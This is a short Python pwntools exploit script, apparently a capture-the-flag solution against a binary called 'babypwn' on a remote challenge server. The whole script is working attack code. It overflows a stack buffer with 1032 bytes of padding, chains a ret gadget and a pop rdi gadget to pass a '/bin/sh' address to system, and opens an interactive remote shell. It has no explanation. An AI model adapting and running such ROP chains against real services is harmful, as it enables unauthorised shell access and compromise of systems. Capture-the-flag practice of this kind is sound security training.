#!/usr/bin/env python2

from pwn import *

elf = ELF('./babypwn')
#p = process('./babypwn')
p = remote('prob.vulnerable.kr', 20035) 

system = elf.plt['system']
printf = elf.plt['printf']
bin_sh = 0x60074c
flag = 0x600710
pop_rdi = 0x4006c3
ret = 0x400451

#p.recv()

context.bits = 64

payload = flat(
    'A'*1032,
    ret,
    pop_rdi,
    bin_sh,
    system
)

p.sendline(payload)

p.interactive()
